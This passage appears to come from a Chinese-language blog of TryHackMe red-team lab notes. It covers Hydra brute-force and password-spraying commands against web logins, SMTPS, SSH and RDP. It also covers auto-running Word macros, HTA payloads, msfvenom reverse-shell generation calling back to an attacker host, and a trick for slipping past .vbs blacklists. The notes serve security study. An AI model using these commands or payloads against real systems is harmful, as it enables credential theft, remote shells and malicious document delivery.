請求，這可以通過使用瀏覽器的開發者工具或使用 Web 代理，如 Burp Suite 來完成。</p></blockquote><h4 id="Hydra破解HTTP登陸頁面基本語法"><a href="#Hydra破解HTTP登陸頁面基本語法" class="headerlink" title="Hydra破解HTTP登陸頁面基本語法"></a>Hydra破解HTTP登陸頁面基本語法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form &quot;/login-get/index.php:username=^USER^&amp;password=^PASS^:S=logout.php&quot; -f </span><br></pre></td></tr></table></figure><blockquote><p>-l admin 我們指定了一個單一的用戶名，使用 -L 指定用戶名詞表。</p></blockquote><blockquote><p>-P 路徑 指定詞表的完整路徑，使用 -p 可以指定單一密碼。</p></blockquote><blockquote><p>10.10.x.x 目標的 IP 地址或完全合格域名(要包含http:&#x2F;&#x2F;或https:&#x2F;&#x2F;)。</p></blockquote><blockquote><p>http-get-form HTTP 請求的類型，可以是 http-get-form 或 http-post-form。</p></blockquote><blockquote><p>login-get&#x2F;index.php 目標 Web 伺服器上的登錄頁面路徑。</p></blockquote><blockquote><p>username&#x3D;^USER^&amp;password&#x3D;^PASS^ 要暴力破解的參數，我們注入 ^USER^ 來暴力破解用戶名，並使用 ^PASS^ 從指定的詞典中破解密碼。</p></blockquote><blockquote><p>指定「失敗」條件 F&#x3D; 或成功條件 S&#x3D;。</p></blockquote><blockquote><p>-f 在找到有效的用戶名和密碼後停止暴力破解攻擊。</p></blockquote><h4 id="其他在線密碼破解工具"><a href="#其他在線密碼破解工具" class="headerlink" title="其他在線密碼破解工具"></a>其他在線密碼破解工具</h4><ul><li>Medusa</li><li>Ncrack</li><li>others!</li></ul><h4 id="小試身手-3"><a href="#小試身手-3" class="headerlink" title="小試身手"></a>小試身手</h4><p><img src="/photo/Red_Team_passwordarttack/27.jpg" alt="27"></p><h5 id="第一題"><a href="#第一題" class="headerlink" title="第一題"></a>第一題</h5><blockquote><p>利用ftp匿名登陸<br>用戶名:anonymous<br>密碼:直接按ENTER<br>尋找檔案，並下載</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.209.239</span><br><span class="line">anonymous</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">cd files</span><br><span class="line">ls</span><br><span class="line">get flag.txt 下載檔案</span><br></pre></td></tr></table></figure><blockquote><p>回主機查看flag.txt<br><img src="/photo/Red_Team_passwordarttack/20.jpg" alt="20"></p></blockquote><h5 id="第二題"><a href="#第二題" class="headerlink" title="第二題"></a>第二題</h5><blockquote><p>用cewl從網站找出建立密碼字表</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/</span><br></pre></td></tr></table></figure><blockquote><p>利用John the ripper將密碼依規則轉換<br>編寫規則</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /opt/john/john.conf</span><br></pre></td></tr></table></figure><blockquote><p>加入規則,並儲存</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Az&quot;[0-9][0-9]&quot;^[!@]</span><br></pre></td></tr></table></figure><blockquote><p>用規則加原本字典產生新的字典</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=clinic.lst --rules=tryhackme --stdout &gt;clinicN.lst</span><br></pre></td></tr></table></figure><blockquote><p>去除重複項</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort clinicN.lst |uniq -u&gt;clinicN1.lst</span><br></pre></td></tr></table></figure><blockquote><p>用新產生的字典進行攻擊</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -l pittman@clinic.thmredteam.com -P clinicN1.lst</span><br><span class="line">smtps://10.10.31.63:465 -v</span><br></pre></td></tr></table></figure><blockquote><p><img src="/photo/Red_Team_passwordarttack/21.jpg" alt="21"></p></blockquote><h5 id="第三題"><a href="#第三題" class="headerlink" title="第三題"></a>第三題</h5><p><img src="/photo/Red_Team_passwordarttack/22.jpg" alt="22"></p><blockquote><p>檢查帳號密碼是用什麼請求的<br><img src="/photo/Red_Team_passwordarttack/23.jpg" alt="23"><br>根據上圖很明顯是用get請求<br>用Burp Suite攔截請求查看<br><img src="/photo/Red_Team_passwordarttack/24.jpg" alt="24"><br>上圖使用者名稱在封包傳輸key是username，密碼在封包傳輸key是password</p></blockquote><blockquote><p>開始破解</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l phillips -P clinicN.lst 10.10.53.138 http-get-form &quot;/login-get:username=^USER^&amp;password=^PASS^:F=Login failed!&quot; -f </span><br></pre></td></tr></table></figure><h5 id="第四題"><a href="#第四題" class="headerlink" title="第四題"></a>第四題</h5><blockquote><p>檢查帳號密碼是用什麼請求的<br>用Burp Suite攔截請求查看<br><img src="/photo/Red_Team_passwordarttack/25.jpg" alt="25"><br>根據上圖很明顯是用post請求<br>上圖使用者名稱在封包傳輸key是username，密碼在封包傳輸key是password</p></blockquote><blockquote><p>製作規則字典</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=clinic.lst --rules=Single-Extra --stdout&gt;clinicNN.lst</span><br></pre></td></tr></table></figure><blockquote><p>開始破解</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -l burgess -P clinicNN.lst 10.10.219.153 http-post-form &quot;/login-post/index.php:username=^USER^&amp;password=^PASS^:S=logout.php&quot; -f</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/photo/Red_Team_passwordarttack/26.jpg" alt="26"></p><h2 id="密碼噴射攻擊"><a href="#密碼噴射攻擊" class="headerlink" title="密碼噴射攻擊"></a>密碼噴射攻擊</h2><h3 id="簡介-5"><a href="#簡介-5" class="headerlink" title="簡介"></a>簡介</h3><blockquote><p>密碼噴灑是一種有效的技術，用於識別有效的憑證。這種技術可以用於各種線上服務和身份驗證系統，如 SSH、SMB、RDP、SMTP、Outlook Web Application 等。暴力破解攻擊針對特定用戶名嘗試許多弱和可預測的密碼。而密碼噴灑攻擊則針對許多用戶名使用一個常見的弱密碼，這有助於避免帳戶鎖定政策。</p></blockquote><h3 id="SSH密碼噴射攻擊"><a href="#SSH密碼噴射攻擊" class="headerlink" title="SSH密碼噴射攻擊"></a>SSH密碼噴射攻擊</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10</span><br></pre></td></tr></table></figure><h3 id="RDP密碼噴射攻擊"><a href="#RDP密碼噴射攻擊" class="headerlink" title="RDP密碼噴射攻擊"></a>RDP密碼噴射攻擊</h3><blockquote><p>假設我們在端口3026上發現了一個暴露的RDP服務。我們可以使用RDPassSpray之類的工具對RDP進行密碼噴灑攻擊。</p></blockquote><h4 id="RDPassSpray"><a href="#RDPassSpray" class="headerlink" title="RDPassSpray"></a>RDPassSpray</h4><blockquote><p>下載工具</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/xFreed0m/RDPassSpray.git</span><br><span class="line">sudo apt install python3-colorlog</span><br></pre></td></tr></table></figure><blockquote><p>查看使用方法及可用參數</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 RDPassSpray.py -h</span><br></pre></td></tr></table></figure><blockquote><p>基礎用法</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026</span><br></pre></td></tr></table></figure><blockquote><p>RDP密碼噴射攻擊</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt</span><br></pre></td></tr></table></figure><blockquote><p>如果我們處於 Active Directory 環境中，我們可以使用 -d 選項來指定域名。<br>-T 選項後跟包含 RDP 伺服器地址的文件路徑。這個文件應該列出了所有將被密碼噴灑攻擊的 RDP 伺服器的 IP 地址或主機名。</p></blockquote><h3 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h3><blockquote><p>Outlook 网页访问（OWA）门户</p></blockquote><ul><li>SprayingToolkit (atomizer.py)：一种用于进行密码喷射攻击的工具，特别针对如 OWA 这样的Web访问门户。</li><li>MailSniper：一种专门用于针对 Microsoft Exchange 邮箱进行攻击的 PowerShell 脚本。<blockquote><p>SMB（服务器消息块）</p></blockquote></li><li>Metasploit (auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_login)：Metasploit 框架中的一个模块，用于对 SMB 服务进行密码喷射攻击。</li></ul><h3 id="小試身手-4"><a href="#小試身手-4" class="headerlink" title="小試身手"></a>小試身手</h3><blockquote><p>創建密碼表</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for year in &#123;2020..2021&#125;; do for char in &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;$&#x27; &#x27;%&#x27; &#x27;^&#x27; &#x27;&amp;&#x27; &#x27;*&#x27; &#x27;(&#x27; &#x27;)&#x27;; do echo Fall$&#123;year&#125;$&#123;char&#125;; done; done &gt;RPDPASS.txt</span><br></pre></td></tr></table></figure><ul><li>for year in {2020..2021}; do：這是一個迴圈，會遍歷 2020 和 2021 這兩個年份。每次迴圈中，year 變量會被設置為這些年份之一。</li><li>for char in ‘!’ ‘@’ ‘#’ ‘$’ ‘%’ ‘^’ ‘&amp;’ ‘*’ ‘(‘ ‘)’ ; do：這是另一個嵌套的迴圈，遍歷一組特殊字符。每次迴圈中，char 變量會被設置為這些特殊字符之一。</li><li>echo Fall${year}${char};：這行命令會輸出一個字符串，開始於 “Fall”，然後是當前的年份（由外層迴圈的 year 變量提供），最後是當前的特殊字符（由內層迴圈的 char 變量提供）。</li><li>done; done &gt;RPDPASS.txt：這裡的 done; done 表示兩個迴圈的結束。&gt;RPDPASS.txt 將所有的 echo 輸出重定向到名為 RPDPASS.txt 的文件中，如果文件已存在則覆蓋它。<blockquote><p>開始破解</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L RDP.txt -P RPDPASS.txt ssh://10.10.235.158</span><br></pre></td></tr></table></figure><blockquote><p>用ssh連接</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh burgess@10.10.235.158</span><br><span class="line">Fall2021@</span><br></pre></td></tr></table></figure><blockquote><p>找出檔案並查看</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/</span><br><span class="line">cat flag</span><br></pre></td></tr></table></figure><img src="/photo/Red_Team_passwordarttack/28.jpg" alt="28"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 紅隊密碼攻擊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 紅隊 </tag>
            
            <tag> 攻擊階段-初訪問密碼攻擊 </tag>
            
            <tag> 筆記 </tag>
            
            <tag> tryhackme </tag>
            
            <tag> 道德黑客 </tag>
            
            <tag> 自學 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Red Team Weaponization</title>
      <link href="/2024/04/25/Red-Team-Weaponization/"/>
      <url>/2024/04/25/Red-Team-Weaponization/</url>
      
        <content type="html"><![CDATA[<h1 id="武器化"><a href="#武器化" class="headerlink" title="武器化"></a>武器化</h1><h2 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h2><blockquote><p>武器化是網路殺傷鏈模型的第二階段。在此階段，攻擊者使用可交付的有效負載（例如 Word 文件、PDF 等）來產生並開發自己的惡意程式碼。武器化階段旨在使用惡意武器來利用目標機器並獲得初始存取權。<br>大多數組織都運行 Windows 作業系統，這將成為可能的目標。組織的環境策略通常會阻止下載和執行 .exe檔以避免安全性違規。因此，紅隊成員依賴建立透過各種管道發送的自訂有效負載，例如網路釣魚活動、社會工程、瀏覽器或軟體開發、USB 或 Web 方法。</p></blockquote><blockquote><p>大多數組織都會阻止或監視其受控環境中.exe檔的執行 。因此，紅隊成員依賴使用其他技術執行有效負載，例如內建 Windows 腳本技術</p></blockquote><blockquote><ul><li>Windows 腳本宿主 (WSH)</li><li>HTML 應用程式 ( HTA )</li><li>可視化基本應用程式 (VBA)</li><li>PowerShell（PSH）</li></ul></blockquote><h2 id="紅隊工具包"><a href="#紅隊工具包" class="headerlink" title="紅隊工具包"></a>紅隊工具包</h2><h3 id="網址"><a href="#網址" class="headerlink" title="網址"></a>網址</h3><blockquote><p><a href="https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development">紅隊工具包</a></p></blockquote><h2 id="部署Windows機器"><a href="#部署Windows機器" class="headerlink" title="部署Windows機器"></a>部署Windows機器</h2><blockquote><p>xfreerdp &#x2F;v:10.10.234.142 &#x2F;u:thm &#x2F;p:TryHackM3 +clipboard<br>使用者名稱：  thm  密碼 ：  TryHackM3 </p></blockquote><h2 id="Windows-腳本宿主-WSH"><a href="#Windows-腳本宿主-WSH" class="headerlink" title="Windows 腳本宿主 - WSH"></a>Windows 腳本宿主 - WSH</h2><h3 id="簡單腳本編寫-VBScript"><a href="#簡單腳本編寫-VBScript" class="headerlink" title="簡單腳本編寫(VBScript)"></a>簡單腳本編寫(VBScript)</h3><h4 id="显示“Welcome-to-THM”消息的-Windows-消息框"><a href="#显示“Welcome-to-THM”消息的-Windows-消息框" class="headerlink" title="显示“Welcome to THM”消息的 Windows 消息框"></a>显示“Welcome to THM”消息的 Windows 消息框</h4><blockquote><p>编写一个简单的 VBScript 代码，用于创建一个显示“Welcome to THM”消息的 Windows 消息框</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dim message</span><br><span class="line">message=&quot;welcome to htm&quot;</span><br><span class="line">MsgBox message</span><br></pre></td></tr></table></figure><blockquote><p>在第一行中，我们使用 Dim 声明了一个名为 message 的变量。然后我们在 message 变量中存储了一个字符串值 “Welcome to THM”。在下一行中，我们使用 MsgBox 函数来显示变量的内容。然后，我们使用 wscript 来运行和执行 hello.vbs 的内容。结果，将会弹出一个带有 “Welcome to THM” 消息的 Windows 消息框。</p></blockquote><h4 id="Windows-原生引擎（WSH）执行-exe-文件"><a href="#Windows-原生引擎（WSH）执行-exe-文件" class="headerlink" title="Windows 原生引擎（WSH）执行 .exe 文件"></a>Windows 原生引擎（WSH）执行 .exe 文件</h4><blockquote><p>VBScript 代码用于调用 Windows 计算器為例</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set shell = WScript.CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">shell.Run(&quot;C:\\Windows\\System32\\calc.exe&quot;), 0, True</span><br></pre></td></tr></table></figure><blockquote><p>Set shell &#x3D; WScript.CreateObject(“WScript.Shell”)<br>这行代码创建了一个 WScript.Shell 对象，并将其赋值给变量 shell。WScript.Shell 是一个提供访问操作系统 shell 的对象。<br>shell.Run(“C:\Windows\System32\calc.exe”), 0, True<br>这行代码使用 shell 对象的 Run 方法来执行系统的计算器程序。<br>“C:\Windows\System32\calc.exe” 是计算器程序的完整路径，使用双反斜线 (\) 是因为在 VBScript 字符串中，单反斜线 () 作为转义字符的引导，所以路径分隔符需要用两个反斜线表示。<br>0 是 Run 方法的第二个参数，表示窗口的显示方式。在这个上下文中，0 表示隐藏窗口，但由于计算器是图形界面程序，它将正常显示。<br>True 是 Run 方法的第三个参数，它决定了 VBScript 是否应该等待程序执行完成才继续执行下一行代码。True 表示 VBScript 会等待计算器关闭，才继续执行。</p></blockquote><h4 id="VBS-文件被列入黑名单處理方式"><a href="#VBS-文件被列入黑名单處理方式" class="headerlink" title="VBS 文件被列入黑名单處理方式"></a>VBS 文件被列入黑名单處理方式</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wscript /e:VBScript c:\Users\thm\Desktop\payload.txt</span><br></pre></td></tr></table></figure><blockquote><p>这行命令使用 wscript，即 Windows Script Host 的图形版本，来执行一个重命名为 .txt 扩展名的 VBScript 脚本。通常，VBScript 脚本会以 .vbs 扩展名保存，但如果 .vbs 文件被系统的安全策略或防病毒软件列入黑名单，将文件扩展名更改为 .txt 可能是一种绕过这些限制的技巧。<br>命令的各部分含义如下：<br>wscript：执行 Windows 脚本宿主，提供用户界面（图形界面），用于运行脚本。<br>&#x2F;e:VBScript：这个参数告诉 wscript 使用 VBScript 引擎执行后面指定的脚本文件。&#x2F;e 参数用于指定要用于处理脚本的脚本引擎。<br>c:\Users\thm\Desktop\payload.txt：这是 VBScript 脚本文件的路径，位于用户 thm 的桌面上，文件名为 payload.txt。</p></blockquote><h2 id="HTML-應用程式-HTA"><a href="#HTML-應用程式-HTA" class="headerlink" title="HTML 應用程式 - HTA"></a>HTML 應用程式 - HTA</h2><h3 id="簡介-1"><a href="#簡介-1" class="headerlink" title="簡介"></a>簡介</h3><blockquote><p>HTA 代表“HTML 应用程序”。它允许你创建一个可下载的文件，该文件包含所有关于如何显示和渲染的信息。HTML 应用程序，也称为 HTAs，是包含 JScript 和 VBScript 的动态 HTML 页面。LOLBINS（活在土地上的二进制文件）工具 mshta 用于执行 HTA 文件。它可以自己执行，也可以通过 Internet Explorer 自动执行。<br>HTML应用程序（HTA）是一种微软的程序文件，它结合了网页设计语言HTML的灵活性和Windows应用程序的功能性。HTA文件是使用HTML和脚本语言（如VBScript或JScript）编写的，通常保存为.hta扩展名。与普通的网页不同，HTA在“受信任的”模式下运行，这意味着它们具有更多的权限，可以访问系统上的文件和设置等资源。<br>LOLBINS（活在土地上的二进制文件）指的是合法的系统工具，它们可以被用于恶意目的。mshta是一个LOLBIN，它可以用来执行HTA文件。mshta可以独立执行，也可以作为Internet Explorer的一部分自动执行。<br>在提到的示例中，ActiveXObject 是在 HTA 中用来创建和操作 COM 对象的机制。COM（组件对象模型）允许Windows组件进行交互，而 ActiveXObject 可以在 HTA 或浏览器中创建这些组件的实例。</p></blockquote><h3 id="範例"><a href="#範例" class="headerlink" title="範例"></a>範例</h3><blockquote><p>将在有效载荷中使用 ActiveXObject 作为概念验证来执行 cmd.exe</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var c= &#x27;cmd.exe&#x27;</span><br><span class="line">new ActiveXObject(&#x27;WScript.Shell&#x27;).Run(c);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><blockquote><p>从 Web 服务器提供 payload.hta 文件,可執行以下程式碼開啟測試伺服器</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8090</span><br></pre></td></tr></table></figure><h3 id="hta反向連接"><a href="#hta反向連接" class="headerlink" title="hta反向連接"></a>hta反向連接</h3><h4 id="生成腳本"><a href="#生成腳本" class="headerlink" title="生成腳本"></a>生成腳本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta</span><br></pre></td></tr></table></figure><blockquote><p>msfvenom：这是 Metasploit 框架的一部分，用于生成自定义恶意载荷。<br>-p windows&#x2F;x64&#x2F;shell_reverse_tcp：指定载荷类型。这里 -p 代表 “payload”，windows&#x2F;x64&#x2F;shell_reverse_tcp 是一个针对 Windows 64位系统的反向 TCP shell 载荷，当执行时会尝试从目标机器连接回攻击者指定的 IP 地址和端口。<br>LHOST&#x3D;10.8.232.37：指定监听主机的 IP 地址（即攻击者的 IP 地址）。这是反向连接将会连接回的地址。<br>LPORT&#x3D;443：指定监听端口。这是反向连接将会连接回的端口。在这个例子中，使用了 HTTPS 默认的端口号 443。<br>-f hta-psh：指定输出格式。这里 -f 代表 “format”，hta-psh 表示输出为 HTML 应用程序（HTA）文件，该文件将包含一个 PowerShell 脚本来执行 shell。<br>-o thm.hta：指定输出文件的名称和位置。这里 -o 代表 “output”，thm.hta 是文件的名称。</p></blockquote><h4 id="啟用監聽"><a href="#啟用監聽" class="headerlink" title="啟用監聽"></a>啟用監聽</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -lvp 443</span><br></pre></td></tr></table></figure><h2 id="Visual-Basic-應用程式-VBA"><a href="#Visual-Basic-應用程式-VBA" class="headerlink" title="Visual Basic 應用程式 - VBA"></a>Visual Basic 應用程式 - VBA</h2><h3 id="簡介-2"><a href="#簡介-2" class="headerlink" title="簡介"></a>簡介</h3><blockquote><p>VBA代表Visual Basic for Applications，這是一種由Microsoft實施的程式設計語言，用於諸如Microsoft Word、Excel、PowerPoint等Microsoft應用程序。VBA編程允許自動化用戶與Microsoft Office應用程序之間幾乎所有鍵盤和鼠標互動的任務。</p></blockquote><h3 id="示範"><a href="#示範" class="headerlink" title="示範"></a>示範</h3><blockquote><p>打開word開啟新文件→view→macros<br><img src="/photo/Red_Team_Weaponization/31.jpg" alt="31"><br><img src="/photo/Red_Team_Weaponization/32.jpg" alt="32"><br>打上名稱後按ENTER，在中間框中打入程式，例如</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sub THM()</span><br><span class="line">  MsgBox (&quot;Welcome to Weaponization Room!&quot;)</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><blockquote><p><img src="/photo/Red_Team_Weaponization/33.jpg" alt="33"><br>按下執行<br><img src="/photo/Red_Team_Weaponization/34.jpg" alt="34"></p></blockquote><h3 id="Microsoft-Word-文檔打開時自動執行"><a href="#Microsoft-Word-文檔打開時自動執行" class="headerlink" title="Microsoft Word 文檔打開時自動執行"></a>Microsoft Word 文檔打開時自動執行</h3><blockquote><p>希望在 Microsoft Word 文檔打開時自動執行某些動作時，可以利用特定的事件處理函數來實現這一點。常用的兩個事件處理函數是 AutoOpen 和 Document_Open。</p></blockquote><h4 id="AutoOpen"><a href="#AutoOpen" class="headerlink" title="AutoOpen"></a>AutoOpen</h4><blockquote><p>AutoOpen 是一個在 Word 文檔打開時自動被調用的傳統宏。當任何文檔被打開時，如果文檔或其模板中存在名為 AutoOpen 的宏，Word 將自動執行它。</p></blockquote><h4 id="Document-Open"><a href="#Document-Open" class="headerlink" title="Document_Open"></a>Document_Open</h4><blockquote><p>AutoOpen 是一個在 Word 文檔打開時自動被調用的傳統宏。當任何文檔被打開時，如果文檔或其模板中存在名為 AutoOpen 的宏，Word 將自動執行它。</p></blockquote><h4 id="示範-1"><a href="#示範-1" class="headerlink" title="示範"></a>示範</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Sub Document_Open()</span><br><span class="line">  THM</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub AutoOpen()</span><br><span class="line">  THM</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub THM()</span><br><span class="line">   MsgBox (&quot;Welcome to Weaponization Room!&quot;)</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><blockquote><p>要使宏正常工作，我們需要將文件保存為支持宏的格式，例如 .doc 和 .docm。現在，讓我們將文件保存為啟用宏的 Word 97-2003 模板，方法是前往「檔案」→「保存Document1」，然後在「另存為類型」中選擇「Word 97-2003 文檔」，最後保存。<br>當每次重啟word時都會執行此程式<br><img src="/photo/Red_Team_Weaponization/36.jpg" alt="36"></p></blockquote><h3 id="Microsoft-Word-文檔打開時自動執行程式"><a href="#Microsoft-Word-文檔打開時自動執行程式" class="headerlink" title="Microsoft Word 文檔打開時自動執行程式"></a>Microsoft Word 文檔打開時自動執行程式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Sub PoC()</span><br><span class="line">Dim payload As String</span><br><span class="line">payload = &quot;calc.exe&quot;</span><br><span class="line">CreateObject(&quot;Wscript.Shell&quot;).Run payload,0</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><blockquote><p>Sub PoC()：這一行定義了一個名為 PoC 的新子程序。Sub 是 Subroutine（子程序）的縮寫，用於在 VBA 中定義一個程序塊，可以在其他地方被調用。<br>Dim payload As String：這行代碼使用 Dim 關鍵字來聲明一個名為 payload 的變量，類型為 String（字符串）。這裡，payload 將用來存儲要執行的命令或文件名。<br>payload &#x3D; “calc.exe”：將字符串 “calc.exe” 賦值給變量 payload。這表示 payload 變量將用來指向計算器應用程序的可執行文件。<br>CreateObject(“Wscript.Shell”).Run payload,0：這行代碼是實際執行操作的關鍵。它使用 CreateObject 函數創建了一個 Wscript.Shell 對象。Wscript.Shell 是一個可提供對 Windows Shell 的訪問的對象，允許 VBA 執行外部應用程序。<br>.Run payload,0 方法用於執行 payload 變量中指定的命令。在這個例子中，它執行 calc.exe，即 Windows 的計算器。<br>方法的第二個參數 0 表示計算器應用程序在背景執行，並且不顯示任何窗口。<br>End Sub：這行代碼表示子程序的結束。</p></blockquote><blockquote><p>後將此代碼加入AutoOpen()和Document_Open()函數裡</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Sub PoC()</span><br><span class="line">Dim payload As String</span><br><span class="line">payload = &quot;calc.exe&quot;</span><br><span class="line">CreateObject(&quot;Wscript.Shell&quot;).Run payload,0</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub AutoOpen()</span><br><span class="line">  PoC</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub Document_Open()</span><br><span class="line">  PoC</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><h3 id="利用msf生成反向連接代碼並連接word"><a href="#利用msf生成反向連接代碼並連接word" class="headerlink" title="利用msf生成反向連接代碼並連接word"></a>利用msf生成反向連接代碼並連接word</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=111.250.150.71 LPORT=443 -f vba</span><br></pre></td></tr></table></figure><blockquote><p>將產生的代碼插入word中並將Workbook_Open() 改為 Document_Open()<br>原始生成的代碼是為 Microsoft Excel 設計的，因此它使用的是 Workbook_Open() 事件處理函數。這個函數是在 Excel 工作簿（Workbook）打開時觸發的。<br><img src="/photo/Red_Team_Weaponization/37.jpg" alt="37"></p></blockquote><h2 id="PowerShell-PSH"><a href="#PowerShell-PSH" class="headerlink" title="PowerShell - PSH"></a>PowerShell - PSH</h2><h3 id="簡介-3"><a href="#簡介-3" class="headerlink" title="簡介"></a>簡介</h3><blockquote><p>PowerShell 是一種從 .NET 的動態語言運行時（DLR）執行的面向對象的編程語言，但在某些遺留用途中有所例外。紅隊成員依靠 PowerShell 執行各種活動，包括初始訪問、系統枚舉等等。</p></blockquote><h3 id="顯示-“Welcome-to-the-Weaponization-Room-”"><a href="#顯示-“Welcome-to-the-Weaponization-Room-”" class="headerlink" title="顯示 “Welcome to the Weaponization Room!”"></a>顯示 “Welcome to the 